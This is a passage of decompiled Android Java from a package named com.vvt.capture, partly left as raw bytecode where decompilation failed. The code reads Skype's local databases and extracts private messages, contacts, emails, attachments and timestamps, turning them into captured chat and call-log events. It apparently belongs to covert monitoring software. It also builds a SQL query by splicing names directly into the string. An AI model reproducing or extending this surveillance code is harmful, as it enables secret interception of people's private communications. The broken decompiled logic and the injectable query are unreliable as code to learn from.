    //   13	158	4	localObject3	Object
    //   16	3	5	i	int
    //   23	72	6	localObject4	Object
    //   51	3	7	bool1	boolean
    //   70	5	7	j	int
    //   107	3	7	bool2	boolean
    //   134	5	8	localObject5	Object
    //   163	6	8	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   18	23	103	java/lang/Exception
    //   28	30	103	java/lang/Exception
    //   32	37	103	java/lang/Exception
    //   44	51	103	java/lang/Exception
    //   64	70	103	java/lang/Exception
    //   74	81	103	java/lang/Exception
    //   83	87	103	java/lang/Exception
    //   94	100	103	java/lang/Exception
    //   18	23	134	finally
    //   28	30	134	finally
    //   32	37	134	finally
    //   44	51	163	finally
    //   64	70	163	finally
    //   74	81	163	finally
    //   83	87	163	finally
    //   94	100	163	finally
    //   104	107	163	finally
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2, ICallLogData.Direction paramDirection, String paramString3, String paramString4)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 6
    //   3: invokestatic 475	com/vvt/capture/e/d:f	()Ljava/lang/String;
    //   6: astore 7
    //   8: iconst_1
    //   9: istore 8
    //   11: iload 8
    //   13: anewarray 182	java/lang/String
    //   16: astore 9
    //   18: iconst_0
    //   19: istore 10
    //   21: aconst_null
    //   22: astore 11
    //   24: aload 9
    //   26: iconst_0
    //   27: aload_2
    //   28: aastore
    //   29: aload_0
    //   30: aload 7
    //   32: aload 9
    //   34: invokevirtual 383	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   37: astore 7
    //   39: aload 7
    //   41: ifnull +173 -> 214
    //   44: aload 7
    //   46: invokeinterface 53 1 0
    //   51: istore 8
    //   53: iload 8
    //   55: ifeq +159 -> 214
    //   58: ldc_w 477
    //   61: astore 9
    //   63: aload 7
    //   65: aload 9
    //   67: invokeinterface 59 2 0
    //   72: istore 8
    //   74: aload 7
    //   76: iload 8
    //   78: invokeinterface 389 2 0
    //   83: astore 9
    //   85: ldc_w 479
    //   88: astore 11
    //   90: aload 7
    //   92: aload 11
    //   94: invokeinterface 59 2 0
    //   99: istore 10
    //   101: aload 7
    //   103: iload 10
    //   105: invokeinterface 483 2 0
    //   110: istore 10
    //   112: getstatic 17	com/vvt/capture/e/d:a	Z
    //   115: istore 12
    //   117: iload 12
    //   119: ifeq +3 -> 122
    //   122: aload 9
    //   124: ifnull +90 -> 214
    //   127: getstatic 173	com/vvt/im/events/info/ICallLogData$Direction:IN	Lcom/vvt/im/events/info/ICallLogData$Direction;
    //   130: astore 13
    //   132: aload_3
    //   133: aload 13
    //   135: if_acmpne +48 -> 183
    //   138: new 132	java/io/File
    //   141: astore 13
    //   143: aload 13
    //   145: aload 9
    //   147: invokespecial 158	java/io/File:<init>	(Ljava/lang/String;)V
    //   150: aload 13
    //   152: invokevirtual 486	java/io/File:exists	()Z
    //   155: istore 12
    //   157: iload 12
    //   159: ifeq +24 -> 183
    //   162: bipush 8
    //   164: istore 12
    //   166: iload 10
    //   168: iload 12
    //   170: if_icmpeq +13 -> 183
    //   173: ldc2_w 488
    //   176: lstore 14
    //   178: lload 14
    //   180: invokestatic 100	android/os/SystemClock:sleep	(J)V
    //   183: aload 9
    //   185: invokestatic 351	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   188: astore 9
    //   190: getstatic 109	com/vvt/im/events/ImType:SKYPE	Lcom/vvt/im/events/ImType;
    //   193: astore 11
    //   195: getstatic 115	com/vvt/im/events/ImMediaFileType:ATTACHMENT	Lcom/vvt/im/events/ImMediaFileType;
    //   198: astore 13
    //   200: aload_1
    //   201: aload 9
    //   203: aload 11
    //   205: aload 13
    //   207: aload 5
    //   209: invokestatic 278	com/vvt/capture/e/FxFileObserverWorker:a	(Ljava/lang/String;Ljava/lang/String;Lcom/vvt/im/events/ImType;Lcom/vvt/im/events/ImMediaFileType;Ljava/lang/String;)Ljava/lang/String;
    //   212: astore 6
    //   214: aload 7
    //   216: ifnull +10 -> 226
    //   219: aload 7
    //   221: invokeinterface 66 1 0
    //   226: aload 6
    //   228: areturn
    //   229: astore 7
    //   231: aconst_null
    //   232: astore 7
    //   234: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   237: istore 8
    //   239: iload 8
    //   241: ifeq +3 -> 244
    //   244: aload 7
    //   246: ifnull -20 -> 226
    //   249: goto -30 -> 219
    //   252: astore 16
    //   254: aconst_null
    //   255: astore 7
    //   257: aload 16
    //   259: astore 6
    //   261: aload 7
    //   263: ifnull +10 -> 273
    //   266: aload 7
    //   268: invokeinterface 66 1 0
    //   273: aload 6
    //   275: athrow
    //   276: astore 6
    //   278: goto -17 -> 261
    //   281: astore 9
    //   283: goto -49 -> 234
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	286	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	286	1	paramString1	String
    //   0	286	2	paramString2	String
    //   0	286	3	paramDirection	ICallLogData.Direction
    //   0	286	4	paramString3	String
    //   0	286	5	paramString4	String
    //   1	273	6	localObject1	Object
    //   276	1	6	localObject2	Object
    //   6	214	7	localObject3	Object
    //   229	1	7	localException1	Exception
    //   232	35	7	localObject4	Object
    //   9	45	8	bool1	boolean
    //   72	5	8	i	int
    //   237	3	8	bool2	boolean
    //   16	186	9	localObject5	Object
    //   281	1	9	localException2	Exception
    //   19	152	10	j	int
    //   22	182	11	localObject6	Object
    //   115	43	12	bool3	boolean
    //   164	7	12	k	int
    //   130	76	13	localObject7	Object
    //   176	3	14	l	long
    //   252	6	16	localObject8	Object
    // Exception table:
    //   from	to	target	type
    //   3	6	229	java/lang/Exception
    //   11	16	229	java/lang/Exception
    //   27	29	229	java/lang/Exception
    //   32	37	229	java/lang/Exception
    //   3	6	252	finally
    //   11	16	252	finally
    //   27	29	252	finally
    //   32	37	252	finally
    //   44	51	276	finally
    //   65	72	276	finally
    //   76	83	276	finally
    //   92	99	276	finally
    //   103	110	276	finally
    //   112	115	276	finally
    //   127	130	276	finally
    //   138	141	276	finally
    //   145	150	276	finally
    //   150	155	276	finally
    //   178	183	276	finally
    //   183	188	276	finally
    //   190	193	276	finally
    //   195	198	276	finally
    //   207	212	276	finally
    //   234	237	276	finally
    //   44	51	281	java/lang/Exception
    //   65	72	281	java/lang/Exception
    //   76	83	281	java/lang/Exception
    //   92	99	281	java/lang/Exception
    //   103	110	281	java/lang/Exception
    //   112	115	281	java/lang/Exception
    //   127	130	281	java/lang/Exception
    //   138	141	281	java/lang/Exception
    //   145	150	281	java/lang/Exception
    //   150	155	281	java/lang/Exception
    //   178	183	281	java/lang/Exception
    //   183	188	281	java/lang/Exception
    //   190	193	281	java/lang/Exception
    //   195	198	281	java/lang/Exception
    //   207	212	281	java/lang/Exception
  }
  
  private static String a(SQLiteDatabase paramSQLiteDatabase, ArrayList paramArrayList)
  {
    Object localObject1 = "";
    Object localObject2 = a(paramArrayList);
    boolean bool1 = false;
    Object localObject3 = new String[0];
    localObject2 = paramSQLiteDatabase.rawQuery((String)localObject2, (String[])localObject3);
    if (localObject2 != null)
    {
      bool1 = ((Cursor)localObject2).moveToFirst();
      if (bool1)
      {
        bool1 = ((Cursor)localObject2).isAfterLast();
        if (!bool1)
        {
          bool1 = a;
          if (bool1) {}
          int i = ((Cursor)localObject2).getColumnIndex("displayname");
          localObject3 = ((Cursor)localObject2).getString(i);
          int j = ((Cursor)localObject2).getColumnIndex("emails");
          String str = ((Cursor)localObject2).getString(j);
          boolean bool3 = com.vvt.ag.b.a((String)localObject3);
          Object localObject4;
          if (!bool3)
          {
            localObject4 = "Name:";
            bool3 = ((String)localObject1).contains((CharSequence)localObject4);
            if (!bool3) {
              break label240;
            }
            localObject4 = new java/lang/StringBuilder;
            ((StringBuilder)localObject4).<init>();
            localObject1 = ((StringBuilder)localObject4).append((String)localObject1);
            localObject4 = " & ";
          }
          for (localObject1 = (String)localObject4 + (String)localObject3;; localObject1 = (String)localObject4 + (String)localObject3)
          {
            boolean bool2 = com.vvt.ag.b.a(str);
            if (!bool2)
            {
              localObject3 = new java/lang/StringBuilder;
              ((StringBuilder)localObject3).<init>();
              localObject1 = ((StringBuilder)localObject3).append((String)localObject1).append(" (").append(str);
              localObject3 = ")";
              localObject1 = (String)localObject3;
            }
            ((Cursor)localObject2).moveToNext();
            break;
            label240:
            localObject4 = new java/lang/StringBuilder;
            ((StringBuilder)localObject4).<init>();
            localObject1 = ((StringBuilder)localObject4).append((String)localObject1);
            localObject4 = " Name: ";
          }
        }
      }
    }
    boolean bool4 = a;
    if (bool4) {}
    return (String)localObject1;
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, boolean paramBoolean)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 17	com/vvt/capture/e/d:a	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: iconst_0
    //   11: istore 4
    //   13: ldc 55
    //   15: astore 5
    //   17: aconst_null
    //   18: astore 6
    //   20: aload 6
    //   22: ifnonnull +84 -> 106
    //   25: bipush 10
    //   27: istore_3
    //   28: iload 4
    //   30: iload_3
    //   31: if_icmpge +75 -> 106
    //   34: aload_0
    //   35: ifnull +285 -> 320
    //   38: ldc_w 518
    //   41: astore 7
    //   43: ldc 55
    //   45: astore 8
    //   47: aload_0
    //   48: astore 5
    //   50: aload_0
    //   51: aload 7
    //   53: aconst_null
    //   54: aconst_null
    //   55: aconst_null
    //   56: aconst_null
    //   57: aconst_null
    //   58: aload 8
    //   60: invokevirtual 465	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   63: astore 5
    //   65: aload 5
    //   67: ifnull +17 -> 84
    //   70: aload 5
    //   72: invokeinterface 521 1 0
    //   77: istore 9
    //   79: iload 9
    //   81: ifgt +36 -> 117
    //   84: getstatic 17	com/vvt/capture/e/d:a	Z
    //   87: istore 9
    //   89: iload 9
    //   91: ifeq +3 -> 94
    //   94: aload 5
    //   96: ifnull +10 -> 106
    //   99: aload 5
    //   101: invokeinterface 66 1 0
    //   106: getstatic 17	com/vvt/capture/e/d:a	Z
    //   109: istore_3
    //   110: iload_3
    //   111: ifeq +3 -> 114
    //   114: aload 6
    //   116: areturn
    //   117: aload 5
    //   119: invokeinterface 524 1 0
    //   124: istore 9
    //   126: iload 9
    //   128: ifeq +181 -> 309
    //   131: ldc_w 526
    //   134: astore 7
    //   136: aload 5
    //   138: aload 7
    //   140: invokeinterface 59 2 0
    //   145: istore 9
    //   147: aload 5
    //   149: iload 9
    //   151: invokeinterface 389 2 0
    //   156: astore 6
    //   158: aload 5
    //   160: astore 7
    //   162: aload 6
    //   164: astore 5
    //   166: aload 7
    //   168: ifnull +10 -> 178
    //   171: aload 7
    //   173: invokeinterface 66 1 0
    //   178: getstatic 17	com/vvt/capture/e/d:a	Z
    //   181: istore 9
    //   183: iload 9
    //   185: ifeq +3 -> 188
    //   188: iload_1
    //   189: ifeq +71 -> 260
    //   192: getstatic 17	com/vvt/capture/e/d:a	Z
    //   195: istore 9
    //   197: iload 9
    //   199: ifeq +141 -> 340
    //   202: aload 5
    //   204: astore 6
    //   206: goto -100 -> 106
    //   209: astore 5
    //   211: iconst_0
    //   212: istore_3
    //   213: aconst_null
    //   214: astore 5
    //   216: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   219: istore 9
    //   221: iload 9
    //   223: ifeq +3 -> 226
    //   226: aload 5
    //   228: ifnull +10 -> 238
    //   231: aload 5
    //   233: invokeinterface 66 1 0
    //   238: aload 6
    //   240: astore 5
    //   242: goto -64 -> 178
    //   245: astore 5
    //   247: aload_2
    //   248: ifnull +9 -> 257
    //   251: aload_2
    //   252: invokeinterface 66 1 0
    //   257: aload 5
    //   259: athrow
    //   260: aload 5
    //   262: ifnonnull +71 -> 333
    //   265: ldc2_w 198
    //   268: lstore 10
    //   270: lload 10
    //   272: invokestatic 100	android/os/SystemClock:sleep	(J)V
    //   275: iload 4
    //   277: iconst_1
    //   278: iadd
    //   279: istore 9
    //   281: aload 5
    //   283: astore 6
    //   285: iload 9
    //   287: istore 4
    //   289: goto -269 -> 20
    //   292: astore 7
    //   294: aload 5
    //   296: astore_2
    //   297: aload 7
    //   299: astore 5
    //   301: goto -54 -> 247
    //   304: astore 7
    //   306: goto -90 -> 216
    //   309: aload 5
    //   311: astore 7
    //   313: aload 6
    //   315: astore 5
    //   317: goto -151 -> 166
    //   320: iconst_0
    //   321: istore 9
    //   323: aconst_null
    //   324: astore 7
    //   326: aload 6
    //   328: astore 5
    //   330: goto -164 -> 166
    //   333: iload 4
    //   335: istore 9
    //   337: goto -56 -> 281
    //   340: aload 5
    //   342: astore 6
    //   344: goto -238 -> 106
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	347	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	347	1	paramBoolean	boolean
    //   1	296	2	localObject1	Object
    //   5	2	3	bool1	boolean
    //   27	5	3	i	int
    //   109	104	3	bool2	boolean
    //   11	323	4	j	int
    //   15	188	5	localObject2	Object
    //   209	1	5	localException1	Exception
    //   214	27	5	localObject3	Object
    //   245	50	5	localObject4	Object
    //   299	42	5	localObject5	Object
    //   18	325	6	localObject6	Object
    //   41	131	7	localObject7	Object
    //   292	6	7	localObject8	Object
    //   304	1	7	localException2	Exception
    //   311	14	7	localObject9	Object
    //   45	14	8	str	String
    //   77	3	9	k	int
    //   87	40	9	bool3	boolean
    //   145	5	9	m	int
    //   181	41	9	bool4	boolean
    //   279	57	9	n	int
    //   268	3	10	l	long
    // Exception table:
    //   from	to	target	type
    //   58	63	209	java/lang/Exception
    //   58	63	245	finally
    //   70	77	292	finally
    //   84	87	292	finally
    //   117	124	292	finally
    //   138	145	292	finally
    //   149	156	292	finally
    //   216	219	292	finally
    //   70	77	304	java/lang/Exception
    //   84	87	304	java/lang/Exception
    //   117	124	304	java/lang/Exception
    //   138	145	304	java/lang/Exception
    //   149	156	304	java/lang/Exception
  }
  
  private static String a(String paramString1, String paramString2)
  {
    boolean bool1 = false;
    String str1 = null;
    if (paramString1 != null) {
      str1 = g.d(paramString1);
    }
    if ((str1 == null) && (paramString1 != null)) {
      str1 = com.vvt.x.a.a(paramString1);
    }
    if ((str1 == null) && (paramString2 != null)) {
      str1 = g.d(paramString2);
    }
    String str2;
    if ((str1 == null) && (paramString1 != null))
    {
      str1 = paramString1.toLowerCase();
      str2 = ".jpg";
      boolean bool2 = str1.endsWith(str2);
      if (!bool2)
      {
        str2 = ".png";
        bool2 = str1.endsWith(str2);
        if (!bool2) {
          break label94;
        }
      }
      str1 = "image/jpeg";
    }
    for (;;)
    {
      return str1;
      label94:
      str2 = ".mp4";
      bool1 = str1.endsWith(str2);
      if (bool1) {
        str1 = "video/mp4";
      } else {
        str1 = "application/x-binary";
      }
    }
  }
  
  private static String a(String paramString, byte[] paramArrayOfByte, ImMediaFileType paramImMediaFileType)
  {
    int i = 0;
    Object localObject1 = null;
    if (paramArrayOfByte != null)
    {
      int j = paramArrayOfByte.length;
      if (j > 0)
      {
        i = paramArrayOfByte.length + -1;
        localObject1 = new byte[i];
        j = 1;
        int k = paramArrayOfByte.length + -1;
        System.arraycopy(paramArrayOfByte, j, localObject1, 0, k);
        Object localObject2 = ImType.SKYPE;
        localObject2 = com.vvt.im.a.c.a(paramString, (ImType)localObject2, paramImMediaFileType);
        String str = com.vvt.im.a.c.a(paramImMediaFileType);
        localObject1 = com.vvt.io.d.a((byte[])localObject1, (String)localObject2, str);
      }
    }
    return (String)localObject1;
  }
  
  private static String a(ArrayList paramArrayList)
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("skypename, ");
    localStringBuilder.append("displayname, ");
    localStringBuilder.append("fullname, ");
    localStringBuilder.append("avatar_image, ");
    localStringBuilder.append("emails, ");
    localStringBuilder.append("mood_text ");
    localStringBuilder.append("FROM Contacts ");
    localStringBuilder.append("WHERE ");
    int i = 0;
    String str = null;
    for (int j = 0;; j = i)
    {
      i = paramArrayList.size();
      if (j >= i) {
        break;
      }
      localStringBuilder.append("skypename = '");
      str = (String)paramArrayList.get(j);
      localStringBuilder.append(str);
      str = "' ";
      localStringBuilder.append(str);
      i = paramArrayList.size() + -1;
      if (j < i)
      {
        str = "OR ";
        localStringBuilder.append(str);
      }
      i = j + 1;
    }
    str = localStringBuilder.toString();
    boolean bool = a;
    if (bool) {}
    return str;
  }
  
  public static ArrayList a(long paramLong1, String paramString1, long paramLong2, com.vvt.base.b paramb, boolean paramBoolean, String paramString2)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = null;
    SQLiteDatabase localSQLiteDatabase1 = null;
    SQLiteDatabase localSQLiteDatabase2 = null;
    for (;;)
    {
      try
      {
        String str = b();
        if (str == null) {
          break label267;
        }
        Object localObject2 = "main.db";
        localObject1 = com.vvt.capture.e.b.a.a.a((String)localObject2, str);
        if (localObject1 != null) {
          localObject2 = "cache_db.db";
        }
        localObject3 = localObject1;
      }
      catch (Exception localException)
      {
        localException = localException;
        bool = c;
        if ((!bool) || (localObject1 != null)) {
          ((SQLiteDatabase)localObject1).close();
        }
        if (localSQLiteDatabase2 != null) {
          localSQLiteDatabase2.close();
        }
        if (localSQLiteDatabase1 != null) {
          localSQLiteDatabase1.close();
        }
        localObject1 = localArrayList;
        continue;
      }
      finally
      {
        bool = false;
        localObject3 = null;
        localObject1 = localObject4;
        if (localObject3 != null) {
          ((SQLiteDatabase)localObject3).close();
        }
        if (localSQLiteDatabase2 != null) {
          localSQLiteDatabase2.close();
        }
        if (localSQLiteDatabase1 != null) {
          localSQLiteDatabase1.close();
        }
      }
      localObject1 = localArrayList;
      continue;
      label267:
      boolean bool = false;
      Object localObject3 = null;
      localObject1 = localArrayList;
    }
  }
  
  public static ArrayList a(SQLiteDatabase paramSQLiteDatabase1, long paramLong1, String paramString1, long paramLong2, String paramString2, com.vvt.base.b paramb, SQLiteDatabase paramSQLiteDatabase2, boolean paramBoolean, SQLiteDatabase paramSQLiteDatabase3, String paramString3)
  {
    bool1 = a;
    if (bool1) {}
    localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    boolean bool2 = false;
    localCursor = null;
    for (;;)
    {
      try
      {
        localObject1 = c();
        boolean bool3 = a;
        if (bool3) {}
        int i = 2;
        Object localObject3 = new String[i];
        int j = 0;
        Object localObject4 = new java/lang/StringBuilder;
        ((StringBuilder)localObject4).<init>();
        localObject4 = ((StringBuilder)localObject4).append(paramLong1);
        Object localObject5 = "";
        localObject4 = ((StringBuilder)localObject4).append((String)localObject5);
        localObject4 = ((StringBuilder)localObject4).toString();
        localObject3[0] = localObject4;
        j = 1;
        localObject4 = new java/lang/StringBuilder;
        ((StringBuilder)localObject4).<init>();
        localObject4 = ((StringBuilder)localObject4).append(paramLong2);
        localObject5 = "";
        localObject4 = ((StringBuilder)localObject4).append((String)localObject5);
        localObject4 = ((StringBuilder)localObject4).toString();
        localObject3[j] = localObject4;
        localCursor = paramSQLiteDatabase1.rawQuery((String)localObject1, (String[])localObject3);
        if (localCursor == null) {
          continue;
        }
        localObject1 = paramSQLiteDatabase1;
        localObject3 = paramString1;
        localObject4 = paramb;
        localObject5 = paramSQLiteDatabase2;
        localObject1 = a(paramSQLiteDatabase1, localCursor, paramString1, paramString2, paramb, paramSQLiteDatabase2, paramBoolean, paramSQLiteDatabase3, paramString3);
      }
      catch (Exception localException)
      {
        Object localObject1;
        bool1 = c;
        if ((bool1) && (localCursor == null)) {
          continue;
        }
        localCursor.close();
        ArrayList localArrayList2 = localArrayList1;
        continue;
      }
      finally
      {
        if (localCursor == null) {
          continue;
        }
        localCursor.close();
      }
      bool2 = a;
      if (bool2) {}
      return (ArrayList)localObject1;
      bool1 = b;
      if (bool1) {}
      localObject1 = localArrayList1;
    }
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase1, Cursor paramCursor, String paramString1, String paramString2, com.vvt.base.b paramb, SQLiteDatabase paramSQLiteDatabase2, boolean paramBoolean, SQLiteDatabase paramSQLiteDatabase3, String paramString3)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    int i5 = 0;
    Object localObject1 = ICallLogData.Direction.UNKNOWN;
    SimpleDateFormat localSimpleDateFormat = new java/text/SimpleDateFormat;
    localObject1 = "dd/MM/yy HH:mm:ss";
    localSimpleDateFormat.<init>((String)localObject1);
    bool1 = paramCursor.moveToLast();
    com.vvt.im.events.info.d locald;
    com.vvt.capture.e.a.c localc;
    com.vvt.im.events.info.f localf;
    com.vvt.im.events.info.b localb;
    int i6;
    String str1;
    String str2;
    String str3;
    int i7;
    boolean bool4;
    if (bool1)
    {
      bool1 = a;
      if (bool1) {}
      locald = a(paramSQLiteDatabase1, paramString1, paramString2);
      localc = new com/vvt/capture/e/a/c;
      localc.<init>();
      localf = new com/vvt/im/events/info/f;
      localf.<init>();
      localb = new com/vvt/im/events/info/b;
      localb.<init>();
      int i = paramCursor.getColumnIndex("id");
      i6 = paramCursor.getInt(i);
      localObject1 = "body_xml";
      i = paramCursor.getColumnIndex((String)localObject1);
      str1 = paramCursor.getString(i);
      boolean bool2 = a;
      if (bool2) {}
      int j = paramCursor.getColumnIndex("convo_id");
      str2 = paramCursor.getString(j);
      j = paramCursor.getColumnIndex("displayname");
      str3 = paramCursor.getString(j);
      localObject1 = "chatmsg_type";
      j = paramCursor.getColumnIndex((String)localObject1);
      boolean bool3 = paramCursor.isNull(j);
      if (bool3) {
        break label342;
      }
      localObject1 = "chatmsg_type";
      int k = paramCursor.getColumnIndex((String)localObject1);
      k = paramCursor.getInt(k);
      i7 = k;
      k = 2;
      if (i7 != k)
      {
        k = 6;
        if (i7 != k)
        {
          k = 5;
          if (i7 != k) {
            break label354;
          }
        }
      }
      bool4 = a;
      if (!bool4) {
        break label1852;
      }
      bool4 = i5;
    }
    label306:
    label342:
    label354:
    String str4;
    String str5;
    int i12;
    long l1;
    long l3;
    String str6;
    label552:
    boolean bool11;
    for (;;)
    {
      boolean bool10 = paramCursor.moveToPrevious();
      if (bool10) {
        break label1859;
      }
      bool4 = a;
      if (bool4) {}
      bool4 = a;
      if (bool4) {}
      return localArrayList1;
      bool4 = false;
      localObject1 = null;
      i7 = 0;
      break;
      int m = paramCursor.getColumnIndex("author");
      str4 = paramCursor.getString(m);
      m = paramCursor.getColumnIndex("from_dispname");
      str5 = paramCursor.getString(m);
      m = paramCursor.getColumnIndex("type");
      i12 = paramCursor.getInt(m);
      m = paramCursor.getColumnIndex("timestamp");
      l1 = paramCursor.getLong(m);
      long l2 = 1000L;
      l3 = l1 * l2;
      localObject1 = new java/util/Date;
      ((Date)localObject1).<init>(l3);
      str6 = localSimpleDateFormat.format((Date)localObject1);
      m = paramCursor.getColumnIndex("participants");
      localObject1 = paramCursor.getString(m);
      bool10 = a;
      if (bool10) {}
      int i8 = 10;
      if (i12 != i8)
      {
        i8 = 13;
        if (i12 != i8)
        {
          i8 = 12;
          if (i12 != i8) {
            break label552;
          }
        }
      }
      bool5 = a;
      if (!bool5) {
        break label1852;
      }
      bool5 = i5;
      continue;
      bool11 = com.vvt.ag.b.a((String)localObject1);
      if (!bool11) {
        break label591;
      }
      bool5 = com.vvt.ag.b.a(str3);
      if (!bool5) {
        break label583;
      }
      bool5 = i5;
    }
    label583:
    localObject1 = a(paramSQLiteDatabase1, str2);
    label591:
    localObject1 = ((String)localObject1).split(" ");
    Object localObject2 = new java/util/ArrayList;
    localObject1 = Arrays.asList((Object[])localObject1);
    ((ArrayList)localObject2).<init>((Collection)localObject1);
    localObject1 = locald.b();
    ((ArrayList)localObject2).remove(localObject1);
    ArrayList localArrayList2 = a(paramSQLiteDatabase1, paramString1, (ArrayList)localObject2, paramString2);
    localObject1 = locald.b();
    boolean bool5 = ((String)localObject1).equals(str4);
    if (bool5)
    {
      localObject1 = ICallLogData.Direction.OUT;
      localObject2 = locald.d();
      localf.c((String)localObject2);
      localObject2 = locald.c();
      localf.a((byte[])localObject2);
    }
    for (Object localObject3 = localObject1;; localObject3 = localException)
    {
      int n = 70;
      Object localObject5;
      String str7;
      if (i12 == n)
      {
        n = 0;
        localObject1 = null;
        localObject2 = ICallLogData.Direction.IN;
        Object localObject4;
        boolean bool14;
        if (localObject3 == localObject2)
        {
          localObject1 = paramSQLiteDatabase1;
          localObject2 = paramString1;
          localObject4 = paramb;
          bool14 = paramBoolean;
          localObject1 = a(paramSQLiteDatabase1, paramString1, paramb, localc, str1, paramBoolean);
        }
        for (;;)
        {
          bool11 = ((b)localObject1).b;
          if (bool11) {
            break label919;
          }
          bool6 = a;
          if (!bool6) {
            break label1852;
          }
          bool6 = i5;
          break;
          localObject2 = ICallLogData.Direction.IN;
          localObject4 = localArrayList2.iterator();
          for (;;)
          {
            bool6 = ((Iterator)localObject4).hasNext();
            if (!bool6) {
              break;
            }
            localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
            localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
            bool14 = ((String)localObject5).equals(str4);
            if (bool14)
            {
              localObject5 = ((com.vvt.im.events.info.e)localObject1).f();
              localf.c((String)localObject5);
              localObject1 = ((com.vvt.im.events.info.e)localObject1).e();
              localf.a((byte[])localObject1);
            }
          }
          localObject2 = ICallLogData.Direction.OUT;
          if (localObject3 == localObject2)
          {
            localObject5 = paramSQLiteDatabase1;
            str7 = str1;
            localObject1 = a(paramSQLiteDatabase1, paramString1, localc, i6, l1, str1, paramb);
          }
        }
        label919:
        localObject2 = MessageType.none;
        i5 = ((MessageType)localObject2).getNumber();
        str1 = ((b)localObject1).a;
        str7 = str1;
        boolean bool6 = i5;
      }
      for (;;)
      {
        int i9 = 253;
        label1016:
        int i13;
        int i10;
        if (i12 != i9)
        {
          i9 = 7;
          if (i7 == i9)
          {
            i9 = 202;
            if (i12 != i9)
            {
              i9 = 255;
              if (i12 != i9)
              {
                i9 = 254;
                if (i12 != i9) {
                  break label1016;
                }
              }
            }
          }
          i9 = 68;
          if (i12 != i9) {
            break label1688;
          }
          localObject5 = paramSQLiteDatabase1;
          l1 = l3;
          localObject2 = a(paramSQLiteDatabase1, paramString1, localc, i6, l3, str7, (ICallLogData.Direction)localObject3, paramString2, paramb, i7);
          i13 = ((b)localObject2).b;
          if (i13 == 0)
          {
            boolean bool12 = a;
            if (!bool12) {
              break label306;
            }
            break label306;
            int i1 = 201;
            if (i12 == i1)
            {
              localObject5 = paramSQLiteDatabase1;
              str7 = str1;
              localObject2 = a(paramSQLiteDatabase1, paramString1, localc, i6, l1, str1, (ICallLogData.Direction)localObject3, paramString2, paramb, paramSQLiteDatabase2, paramBoolean);
              boolean bool7 = ((b)localObject2).b;
              if (!bool7)
              {
                bool7 = a;
                if (!bool7) {
                  break label1852;
                }
                bool7 = i5;
                break label306;
              }
              localObject1 = MessageType.none;
              i2 = ((MessageType)localObject1).getNumber();
              str1 = ((b)localObject2).a;
              str7 = str1;
              continue;
            }
            int i2 = 202;
            if (i12 == i2)
            {
              a(paramSQLiteDatabase1, paramString1, localc, str1);
              localObject1 = MessageType.ShareLocation;
              i2 = ((MessageType)localObject1).getNumber();
              str7 = str1;
              continue;
            }
            i2 = 253;
            if (i12 == i2)
            {
              String str8 = paramb.f();
              str7 = paramString1;
              a(paramSQLiteDatabase1, paramSQLiteDatabase3, paramString1, localc, i6, str1, paramBoolean, paramString3, str8, paramString2);
              localObject1 = MessageType.Sticker;
              i2 = ((MessageType)localObject1).getNumber();
              str1 = null;
              str7 = null;
              continue;
            }
            i2 = 255;
            if (i12 == i2)
            {
              str7 = paramString1;
              localObject2 = a(paramSQLiteDatabase1, paramSQLiteDatabase2, paramString1, localc, i6, str1, (ICallLogData.Direction)localObject3, paramb, paramBoolean, paramString2);
              boolean bool8 = ((b)localObject2).b;
              if (!bool8)
              {
                bool8 = a;
                if (!bool8) {
                  break label1852;
                }
                bool8 = i5;
                break label306;
              }
              localObject1 = MessageType.none;
              i3 = ((MessageType)localObject1).getNumber();
              str1 = ((b)localObject2).a;
              str7 = str1;
              continue;
            }
            int i3 = 254;
            if (i12 == i3)
            {
              str7 = paramString1;
              localObject2 = b(paramSQLiteDatabase1, paramSQLiteDatabase2, paramString1, localc, i6, str1, (ICallLogData.Direction)localObject3, paramb, paramBoolean, paramString2);
              boolean bool9 = ((b)localObject2).b;
              if (!bool9)
              {
                bool9 = a;
                if (!bool9) {
                  break label1852;
                }
                bool9 = i5;
                break label306;
              }
              localObject1 = MessageType.none;
              i4 = ((MessageType)localObject1).getNumber();
              str1 = ((b)localObject2).a;
              str7 = str1;
              continue;
            }
            i4 = 63;
            if (i12 != i4) {
              break label1866;
            }
            localObject1 = MessageType.Contact;
            i4 = ((MessageType)localObject1).getNumber();
            i10 = paramCursor.getColumnIndex("body_xml");
            localObject2 = g.c(paramCursor.getString(i10));
            str1 = a(paramSQLiteDatabase1, (ArrayList)localObject2);
            str7 = str1;
            continue;
          }
          localObject1 = MessageType.none;
          i4 = ((MessageType)localObject1).getNumber();
          str7 = ((b)localObject2).a;
        }
        for (;;)
        {
          localc.a(i4);
          localc.b(l3);
          localc.b(str6);
          try
          {
            localObject2 = Html.fromHtml(str7);
            str7 = localObject2.toString();
          }
          catch (Exception localException)
          {
            boolean bool13;
            int i11;
            for (;;) {}
          }
          localc.a(str7);
